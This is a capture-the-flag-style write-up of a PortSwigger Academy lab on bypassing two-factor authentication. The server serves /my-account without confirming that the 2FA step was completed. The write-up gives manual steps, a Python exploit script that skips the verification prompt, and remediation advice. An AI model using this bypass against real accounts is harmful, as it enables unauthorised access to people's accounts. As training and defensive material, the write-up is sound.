# 2FA Simple Bypass

**Lab:** [2FA simple bypass](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass) — PortSwigger Web Security Academy
**Category:** Authentication — Multi-Factor Authentication
**Difficulty:** Apprentice

## Problem

This lab's two-factor authentication can be bypassed. A valid username/password pair is available (`wiener:peter`), but no 2FA verification code is available for either account. The goal is to reach Carlos's account page (`/my-account`) without ever submitting a correct 2FA code.

## Discovery / Exploitation

Logging in with `wiener:peter` behaves normally: the credentials are accepted, the server redirects to a page asking for a verification code (sent to `wiener`'s email), and only after submitting that code does the session gain access to `/my-account`.

The key observation is in what the server is actually checking at each step:

1. Submitting valid username/password creates an authenticated-but-unverified session and redirects to `/login2` (the 2FA prompt).
2. `/my-account` is expected to require that the session also be 2FA-verified.
3. Testing this assumption: after submitting valid credentials but *before* entering any 2FA code, manually requesting `/my-account` directly succeeds.

The server enforces 2FA only at the point of *displaying the verification prompt* — it never actually checks, server-side, whether verification was completed before serving the account page. Once the username/password step succeeds, the session is already privileged enough to reach `/my-account`; the 2FA code is effectively decorative. This is a broken access control flaw hiding inside an authentication flow, not a weakness in the 2FA mechanism itself.

Since the same logic applies to any account, the same technique works against Carlos even without ever receiving his verification code — only his username and password are needed.

## Proof of Concept

**Manual steps:**
1. Log in with `carlos:montoya`.
2. When redirected to the "enter verification code" page, do not submit a code.
3. Manually navigate to `/my-account`.
4. The account page loads — the lab is solved.

**Python exploit script:**

```python
import sys
import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url, path="/login"):
    """Fetch the login page and extract the CSRF token PortSwigger forms require."""
    r = s.get(url + path, proxies=proxies, verify=False)
    match = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not match:
        print("[-] could not find csrf token on " + path)
        sys.exit(-1)
    return match.group(1)


def access_carlos_account(s, url):
    print("[+] logging into carlos's account and bypassing 2fa verification....")

    # 1. Grab a CSRF token from the login page first (needed for the POST)
    csrf = get_csrf_token(s, url)

    login_url = url + "/login"
    login_data = {
        "csrf": csrf,
        "username": "carlos",
        "password": "montoya",
    }

    # 2. Submit valid credentials — this gets us a session that is
    #    "logged in" but still pending 2FA verification
    r = s.post(login_url, data=login_data, proxies=proxies,
               allow_redirects=False, verify=False)

    if r.status_code != 302:
        print("[-] login failed, got status: %d" % r.status_code)
        sys.exit(-1)

    # 3. The vulnerability: the server never actually checks whether
    #    2FA was completed before serving /my-account. Skip the
    #    verification code prompt entirely and request it directly.
    myaccount_url = url + "/my-account"
    r = s.get(myaccount_url, proxies=proxies, verify=False)

    if "Log Out" in r.text or "log out" in r.text.lower():
        print("[+] successfully bypassed 2fa verification")
    else:
        print("[-] could not exploit")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[+] usage: %s <url>" % sys.argv[0])
        print("[+] example: %s https://your-lab-id.web-security-academy.net" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].rstrip("/")
    access_carlos_account(s, url)


if __name__ == "__main__":
    main()
```

Usage:

```bash
python3 2fa_bypass.py https://your-lab-id.web-security-academy.net
```

## Remediation

- Enforce 2FA state server-side on every protected endpoint, not just at the login redirect. The session object should carry a `2fa_verified` flag that every authenticated route checks, not just the route that renders the verification prompt.
- Never grant a session access to authenticated resources until *all* required authentication factors have been completed.
- Treat the post-password, pre-2FA session as a distinct, minimally-privileged state — it should only be able to reach the verification endpoint itself, nothing else.
- Apply the same server-side check consistently across the whole application; a single unprotected route (like `/my-account` here) is enough to defeat 2FA entirely.
